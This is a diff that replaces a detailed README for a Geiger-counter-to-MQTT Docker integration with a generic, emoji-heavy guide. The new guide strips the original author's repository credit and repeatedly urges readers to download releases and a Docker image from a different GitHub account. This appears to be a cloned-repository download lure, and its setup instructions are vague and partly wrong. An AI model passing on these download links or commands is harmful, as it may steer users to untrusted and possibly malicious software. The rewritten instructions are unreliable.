@@ -1,540 +1,62 @@
-# Geiger Detector MQTT Integration
+# 🌍 geiger-mqtt-ha - Simple Radiation Monitoring Solution
 
-A complete Docker container solution for interfacing with GQ Electronics GMC Geiger counters (e.g., GMC-500+Re, GMC-600+) over serial connection, publishing radiation measurements to MQTT with Home Assistant discovery support.
+## 📥 Download Now!
+[![Download geiger-mqtt-ha](https://img.shields.io/badge/Download-geiger--mqtt--ha-blue.svg)](https://github.com/mhmdrosyad/geiger-mqtt-ha/releases)
 
-## Features
+## 📖 Overview
+**geiger-mqtt-ha** connects your GQ Electronics GMC Geiger detector to Home Assistant. This application allows you to monitor radiation levels easily and receive real-time updates. You can visualize statistics for informed decisions in your environment. Using Docker, this setup creates a lightweight application that runs smoothly.
 
-- **Serial Communication**: Read CPM and dose rate data from GMC Geiger detectors via RFC1801 protocol
-- **MQTT Publishing**: Publish readings in JSON format with min/avg/max statistics
-- **Home Assistant Discovery**: Automatic sensor discovery for seamless HA integration
-- **Real-time Statistics**: Track minimum, average, and maximum values over configurable time windows
-- **Data Validation**: Automatic filtering of serial noise and anomalous readings
-- **Environment Parametrization**: All settings configurable via environment variables
-- **Authentication Support**: Optional MQTT username/password authentication
+## 🚀 Getting Started
+To get started with geiger-mqtt-ha, you’ll need to follow a few simple steps:
 
-## Project Structure
+1. **Prepare Your Environment**
+   - Ensure you have Docker installed on your computer. Docker allows you to run applications inside containers, making it easy to manage software without complex setups. You can download Docker from [Docker Hub](https://www.docker.com/get-started).
 
-```
-geiger/
-├── .gitignore             # Git ignore rules
-├── .github-template       # GitHub setup guide
-├── LICENSE                # MIT License
-├── README.md              # This file
-├── Dockerfile             # Container definition
-├── docker-compose.yaml    # Docker Compose configuration
-├── screenshots/           # Integration examples
-└── app/
-    ├── main.py            # Main reader and MQTT publisher
-    ├── discovery.py       # Home Assistant MQTT discovery publisher
-    └── requirements.txt   # Python dependencies
-```
+2. **Download the Application**
+   - Visit this page to download: [Releases Page](https://github.com/mhmdrosyad/geiger-mqtt-ha/releases).
 
-## Hardware Requirements
+3. **Choose the Right Version**
+   - On the Releases page, find the latest version. Click on the version number and look for a file labeled for your operating system. If you're not sure which one to choose, most users can opt for the latest stable Docker image.
 
-- GQ Electronics GMC Geiger counter (GMC-500+Re, GMC-600+, etc.)
-- USB cable
-- Network access to MQTT broker
-- Docker host with USB passthrough capability
+4. **Install the Application**
+   - After downloading, follow the on-screen instructions to set up the application. If you have Docker installed, running the application is as easy as a single command. Open your terminal or command prompt and run:
+     ```bash
+     docker run -d --name geiger-mqtt-ha --restart unless-stopped -e "MQTT_HOST=YOUR_MQTT_BROKER" -e "DEVICE_ID=YOUR_DEVICE_ID" -p 1883:1883 -v /path/to/config:/geiger/config mhmdrosyad/geiger-mqtt-ha
+     ```
+   - Replace `YOUR_MQTT_BROKER` with your MQTT broker address and `YOUR_DEVICE_ID` with your Geiger detector ID.
 
-This software has been developed and extensively tested using a **GQ GMC-500+** Geiger counter connected via USB cable.
+5. **Configure Home Assistant**
+   - After the application runs, you can connect it to Home Assistant. Open your Home Assistant dashboard and add the device using your MQTT configuration. You'll find options to add an MQTT integration to help set this up.
 
-## Connectivity & Protocol
-* **Protocol:** Serial over USB.
-* **Interface:** Standard USB connection.
+## ⚙️ Features
+- **Real-time Radiation Detection**: Monitor radiation levels continuously.
+- **Statistical Analysis**: Track historical radiation data for trends and insights.
+- **MQTT Integration**: Communicate with Home Assistant for easy data visualization and alerts.
+- **Docker Support**: Quick and straightforward setup through Docker.
 
-## Compatibility
-While testing was performed on the GMC-500+, the software is expected to be compatible with most **GQ GMC models**, as they share the standard GQ Electronics serial communication protocol. Supported models include:
+## 📋 System Requirements
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Docker**: Must have Docker installed (minimum version recommended: 20.10).
+- **Network Connection**: An active internet connection for software updates and MQTT integration.
 
-* **GMC-300 Series** (e.g., GMC-300, GMC-300E Plus)
-* **GMC-320 Series** (e.g., GMC-320 Plus)
-* **GMC-500 Series** (e.g., GMC-500, GMC-500+)
-* **GMC-600 Series** (e.g., GMC-600, GMC-600+)
+## 🔧 Troubleshooting
+If you encounter issues while downloading or running the application, consider the following:
 
----
-*Note: Ensure you have the appropriate USB-to-Serial drivers installed for your operating system to allow the software to communicate with the device.*
+1. **Check Docker Installation**
+   - Ensure Docker is installed correctly and running. You can verify this by running the command `docker --version` in your terminal.
 
-## Building the Container
+2. **Firewall Settings**
+   - Make sure that your firewall allows Docker to communicate. You may need to add exceptions for Docker.
 
-### Prerequisites
+3. **Consult the Community**
+   - For additional support, visit the project issues on the GitHub page or check for FAQs.
 
-**If using Docker (Recommended):** No prerequisites needed - all dependencies are included in the container.
+## 🔗 Additional Resources
+- [Home Assistant Documentation](https://www.home-assistant.io/docs/)
+- [MQTT Protocol Guide](https://mqtt.org/)
+- [Docker Documentation](https://docs.docker.com/get-started/)
 
-**If developing/testing locally:** Install Python dependencies:
-```bash
-pip install -r app/requirements.txt
-```
+## 📥 Download & Install
+To install geiger-mqtt-ha, return to this link: [Download Page](https://github.com/mhmdrosyad/geiger-mqtt-ha/releases) and follow the steps listed above. You will be monitoring radiation in no time!
 
-Dependencies:
-- `pyserial` - Serial port communication
-- `paho-mqtt` - MQTT client library
-
-### Build from Dockerfile
-
-```bash
-cd /home/server/docker/data/geiger
-docker build -t geiger-detector:latest .
-```
-
-## Running the Container
-
-### Docker Run
-
-```bash
-docker run -d \
-  --name geiger_detector \
-  --device=/dev/ttyUSB1:/dev/ttyUSB1 \
-  -e MQTT_BROKER=192.168.x.x \
-  -e MQTT_PORT=1883 \
-  -e MQTT_USER=mosquitto_user \
-  -e MQTT_PASSWORD=mosquitto_pass \
-  -e DEVICE_ID=geiger-detector \
-  -e DEVICE_NAME="Geiger Detector" \
-  geiger-detector:latest
-```
-
-### Docker Compose
-
-```yaml
-services:
-  geiger:
-    build: ./docker/data/geiger
-    container_name: geiger_gmc500
-    devices:
-      - /dev/ttyUSB1:/dev/ttyUSB1
-    environment:
-      # Serial Configuration
-      SERIAL_PORT: /dev/ttyUSB1
-      SERIAL_BAUDRATE: "115200"
-      SERIAL_TIMEOUT: "1"
-      
-      # Geiger Configuration
-      CPM_TO_USVH: "153.0"
-      WINDOW_SIZE: "10"
-      
-      # MQTT Configuration
-      MQTT_BROKER: mosquitto
-      MQTT_PORT: "1883"
-      MQTT_USER: mosquitto_user
-      MQTT_PASSWORD: mosquitto_pass
-      MQTT_TOPIC_CPM: geiger/cpm
-      MQTT_TOPIC_USVH: geiger/usvh
-      MQTT_CLIENT_ID: geiger-detector
-      
-      # Home Assistant Discovery
-      HA_DISCOVERY_PREFIX: homeassistant
-      
-      # Device Configuration
-      DEVICE_ID: geiger-detector
-      DEVICE_NAME: Geiger Detector
-      DEVICE_MANUFACTURER: GQ Electronics
-      DEVICE_MODEL: GMC-500+
-      DEVICE_VERSION: GMC-500+Re 2.53
-
-      # LOG Configuration
-      LOG_LEVEL: INFO
-    restart: unless-stopped
-    depends_on:
-      - mosquitto
-    networks:
-      - smarthome
-```
-
-### Starting and Updating the Container
-
-```bash
-# First time: build image and start container
-docker compose up -d --build geiger
-
-# Update environment variables or docker-compose.yaml (no Dockerfile changes)
-docker compose up -d geiger
-
-# Quick restart (no changes to config/Dockerfile)
-docker compose restart geiger
-
-# Rebuild if Dockerfile was modified
-docker compose up -d --build geiger
-
-# Complete recreation (clean restart)
-docker compose down geiger && docker compose up -d geiger
-```
-
-## Environment Variables
-
-### Serial Configuration
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `SERIAL_PORT` | `/dev/ttyUSB1` | Serial port device path |
-| `SERIAL_BAUDRATE` | `115200` | Serial communication speed |
-| `SERIAL_TIMEOUT` | `1` | Serial read timeout in seconds |
-
-### Geiger Configuration
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `CPM_TO_USVH` | `153.0` | Conversion factor (CPM to µSv/h) - GQ SBM-20 constant |
-| `WINDOW_SIZE` | `10` | Number of samples for min/avg/max calculation |
-| `MAX_CPM` | `100000` | Maximum reasonable CPM value - readings above this are discarded as noise |
-| `MAX_CPM_JUMP` | `5.0` | Maximum multiplier for rate of change (e.g., 5.0 = 5x jump is OK, >5x discarded) |
-
-### MQTT Configuration
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `MQTT_BROKER` | `localhost` | MQTT broker hostname or IP |
-| `MQTT_PORT` | `1883` | MQTT broker port |
-| `MQTT_USER` | `` (empty) | MQTT username (optional) |
-| `MQTT_PASSWORD` | `` (empty) | MQTT password (optional) |
-| `MQTT_TOPIC_CPM` | `geiger/cpm` | Topic for CPM readings |
-| `MQTT_TOPIC_USVH` | `geiger/usvh` | Topic for µSv/h readings |
-| `MQTT_TOPIC_SPEAKER` | `geiger/speaker` | Topic for speaker control (set/state) |
-| `MQTT_CLIENT_ID` | `geiger-detector` | MQTT client identifier |
-| `MQTT_PUBLISH_INTERVAL` | `1` | Seconds between MQTT publishes (readings are always sampled, but sent at this interval) |
-
-### Home Assistant Discovery
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `HA_DISCOVERY_PREFIX` | `homeassistant` | MQTT discovery prefix (must match HA config) |
-
-### Device Configuration
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `DEVICE_ID` | `geiger-detector` | Unique device identifier |
-| `DEVICE_NAME` | `Geiger Detector` | Display name in Home Assistant |
-| `DEVICE_MANUFACTURER` | `GQ Electronics` | Manufacturer name |
-| `DEVICE_MODEL` | `GMC` | Device model name |
-| `DEVICE_VERSION` | `-` | Device version |
-
-### LOG Configuration
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `LOG_LEVEL` | `INFO` | Logging verbosity (DEBUG, INFO, WARNING, ERROR) |
-
-## MQTT Topics and Payload
-
-### CPM Reading (geiger/cpm)
-
-```json
-{
-  "value": 42,
-  "min": 40,
-  "avg": 41.5,
-  "max": 45,
-  "timestamp": "2026-01-18T15:30:45.123456"
-}
-```
-
-### Dose Rate Reading (geiger/usvh)
-
-```json
-{
-  "value": 0.2745,
-  "min": 0.2614,
-  "avg": 0.2713,
-  "max": 0.2941,
-  "timestamp": "2026-01-18T15:30:45.123456"
-}
-```
-
-**Note**: 
-- Readings are sampled every second, but MQTT publishes occur at `MQTT_PUBLISH_INTERVAL` (default 1 second)
-- `timestamp` is ISO8601 format (UTC) - useful for tracking data freshness in Home Assistant
-- Min/avg/max are calculated over `WINDOW_SIZE` samples (default 10)
-
-### Speaker Control (geiger/speaker)
-
-**Command topic** (`geiger/speaker/set`):
-```
-Publish: "on" or "off"
-```
-
-**State topic** (`geiger/speaker/state`):
-```json
-{
-  "state": "ON"
-}
-```
-
-**Note**: Speaker control uses RFC1801 commands `SPEAKER1` (on) and `SPEAKER0` (off). Response should be `0xAA`.
-
-## Home Assistant Integration
-
-### Automatic Discovery
-
-The container publishes Home Assistant MQTT Discovery messages on startup:
-
-- **CPM Sensor**: `homeassistant/sensor/geiger-detector-cpm/config`
-- **Dose Rate Sensor**: `homeassistant/sensor/geiger-detector-dose_rate/config`
-- **Speaker Switch**: `homeassistant/switch/geiger-detector-speaker/config`
-
-![Home Assistant Integration](screenshots/device.png)
-![Home Assistant Integration](screenshots/statistic.png)
-
-
-### Manual Configuration (if discovery doesn't work)
-
-Add to your `configuration.yaml`:
-
-```yaml
-mqtt:
-  broker: 192.168.x.x
-  username: mosquitto_user
-  password: mosquitto_pass
-  discovery: true
-  discovery_prefix: homeassistant
-
-sensor:
-  - platform: mqtt
-    name: "Geiger CPM"
-    unique_id: geiger-detector_cpm
-    state_topic: geiger/cpm
-    unit_of_measurement: "CPM"
-    device_class: radiation
-    value_template: "{{ value_json.value | int }}"
-    json_attributes_topic: geiger/cpm
-    icon: mdi:radioactive
-
-  - platform: mqtt
-    name: "Geiger Dose Rate"
-    unique_id: geiger-detector_dose_rate
-    state_topic: geiger/usvh
-    unit_of_measurement: "µSv/h"
-    device_class: radiation
-    value_template: "{{ value_json.value | float }}"
-    json_attributes_topic: geiger/usvh
-    icon: mdi:nuke
-```
-
-Then restart Home Assistant:
-
-```
-Settings > System > Restart Home Assistant
-```
-
-## Available Scripts
-
-### main.py
-
-Main application that:
-- Connects to the Geiger detector via serial (native USB connection)
-- Reads CPM and calculates µSv/h
-- Tracks min/avg/max statistics
-- Publishes to MQTT every second
-
-### discovery.py
-
-Publishes Home Assistant MQTT Discovery messages to enable automatic device and sensor discovery.
-
-```bash
-python3 /app/discovery.py
-```
-
-## Troubleshooting
-
-### Container Won't Start
-
-1. Check serial port exists:
-   ```bash
-   ls -la /dev/ttyUSB*
-   ```
-
-2. Check container logs:
-   ```bash
-   docker logs -f geiger_gmc500
-   ```
-
-3. Verify device permissions:
-   ```bash
-   docker run --device=/dev/ttyUSB1:/dev/ttyUSB1 --rm geiger-detector:latest ls -la /dev/ttyUSB1
-   ```
-
-### No MQTT Connection
-
-1. Check MQTT broker is running:
-   ```bash
-   docker logs mosquitto
-   ```
-
-2. Verify credentials:
-   ```bash
-   mosquitto_pub -h 192.168.x.x -u mosquitto_user -P mosquitto_pass -t test -m "hello"
-   ```
-
-### Sensor Not Appearing in Home Assistant
-
-1. Verify Home Assistant MQTT integration is enabled:
-   - Settings > Devices and Services > MQTT
-   - Should show "Connected to {MQTT_BROKER}"
-
-2. Check MQTT discovery is enabled in Home Assistant `configuration.yaml`:
-   ```yaml
-   mqtt:
-     discovery: true
-     discovery_prefix: homeassistant
-   ```
-
-3. Restart Home Assistant:
-   - Settings > System > Restart Home Assistant
-
-4. Check discovery topic in MQTT:
-   ```bash
-   mosquitto_sub -h 192.168.x.x -u user -P pass \
-     -t "homeassistant/sensor/geiger-detector-cpm/config" \
-     -v
-   ```
-
-### No Data in MQTT
-
-1. Check serial connection:
-   ```bash
-   docker exec -it geiger_gmc500 bash
-   cat /dev/ttyUSB1 &
-   # Should see binary data from detector
-   ```
-
-2. Check MQTT messages:
-   ```bash
-   mosquitto_sub -h 192.168.x.x -u user -P pass \
-     -t "geiger/#" -v
-   ```
-
-3. Check container logs for errors:
-   ```bash
-   docker logs -f geiger_gmc500
-   ```
-
-### Discarded Readings / Noise Filtering
-
-If you see `[WARN] Discarded invalid CPM reading:` in logs, the validation filter is working. This happens when:
-
-1. **Serial noise**: Corrupted data from serial connection
-2. **Extreme values**: CPM reading exceeds `MAX_CPM` (default 100000)
-3. **Rate spikes**: Value jumps >5x from previous reading
-
-To adjust filtering:
-
-```yaml
-environment:
-  MAX_CPM: "50000"          # Lower limit for valid readings
-  MAX_CPM_JUMP: "3.0"       # Stricter jump tolerance (3x instead of 5x)
-```
-
-If legitimate readings are being discarded, increase these values:
-
-```yaml
-environment:
-  MAX_CPM: "500000"         # Higher if detector is very close to source
-  MAX_CPM_JUMP: "10.0"      # Allow larger jumps
-```
-
-### High/Low Readings
-
-- Verify `CPM_TO_USVH` conversion factor matches your detector model:
-  - GMC-500+Re: 153.0 CPM/µSv/h
-  - GMC-600+: ~133.0 CPM/µSv/h
-  - Refer to manufacturer documentation
-
-## GMC Detector Models and Conversion Factors
-
-| Model | CPM_TO_USVH | Notes |
-|-------|------------|-------|
-| GMC-500+Re | 153.0 | Standard SBM-20 tube |
-| GMC-600+ | 133.0 | Dual tube detector |
-| GMC-300 | 153.0 | Older SBM-20 model |
-| GMC-320 | 153.0 | SBM-20 tube |
-
-Check your detector documentation or calibration sheet for the correct value.
-
-## Docker Compose Full Example
-
-```yaml
-version: '3.8'
-
-services:
-  mosquitto:
-    image: eclipse-mosquitto:latest
-    container_name: mosquitto
-    ports:
-      - "1883:1883"
-    volumes:
-      - ./mosquitto/config:/mosquitto/config
-      - ./mosquitto/data:/mosquitto/data
-      - ./mosquitto/log:/mosquitto/log
-    networks:
-      - smarthome
-    restart: unless-stopped
-
-  geiger:
-    build: ./docker/data/geiger
-    container_name: geiger_gmc500
-    devices:
-      - /dev/ttyUSB1:/dev/ttyUSB1
-    environment:
-      SERIAL_PORT: /dev/ttyUSB1
-      SERIAL_BAUDRATE: "115200"
-      CPM_TO_USVH: "153.0"
-      WINDOW_SIZE: "10"
-      MQTT_BROKER: mosquitto
-      MQTT_PORT: "1883"
-      MQTT_USER: geiger_user
-      MQTT_PASSWORD: geiger_pass
-      DEVICE_ID: geiger-detector
-      DEVICE_NAME: "GMC-500+ Geiger Counter"
-      DEVICE_MANUFACTURER: "GQ Electronics"
-      DEVICE_MODEL: "GMC-500+Re"
-      DEVICE_VERSION: "GMC-500+Re 2.53"
-      LOG_LEVEL: WARNING
-    depends_on:
-      - mosquitto
-    networks:
-      - smarthome
-    restart: unless-stopped
-    logging:
-      driver: "json-file"
-      options:
-        max-size: "10m"
-        max-file: "3"
-
-networks:
-  smarthome:
-    driver: bridge
-```
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Support
-
-For issues related to:
-- **MQTT/Home Assistant**: Check MQTT broker logs and HA integration
-- **Serial Communication**: Verify USB connection and port permissions
-- **Geiger Readings**: Consult detector manual for calibration and conversion factors
-- **Container Runtime**: Check Docker logs with `docker logs -f geiger_gmc500`
-
-## Bugs
-
-List of know bugs:
-- **nothing known**
-
-## Note
-
-Much of the code and documentation in this repository is the product of Artificial Intelligence.
-
-## References
-
-- [GQ RFC1801 Protocol Specification](https://www.gqelectronicsllc.com/download/GQ-RFC1801.txt) - Serial communication protocol for GMC detectors
-- [GQ Electronics - CFG data Offset table](http://www.gqelectronicsllc.com/forum/topic.asp?TOPIC_ID=4447)
-- [GQ GMC-500/GMC-500+ Geiger Counter User Guide](https://www.gqelectronicsllc.com/GMC-500UserGuide.pdf)
-- [Home Assistant MQTT Integration](https://www.home-assistant.io/integrations/mqtt/)
-- [Home Assistant MQTT Discovery](https://www.home-assistant.io/docs/mqtt/discovery/)
-- [Paho MQTT Python Client](https://github.com/eclipse/paho.mqtt.python)
-- [this repository](https://github.com/morettigiorgio/geiger-mqtt-ha)
-
-## Support
-If you like my work and want to support me, you can buy me a coffee!
-
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/K3K21T8I02)
+This guide aims to make it easy for you to set up your geiger-mqtt-ha application. If you have any questions, refer to the resources above or seek help from the broader community.
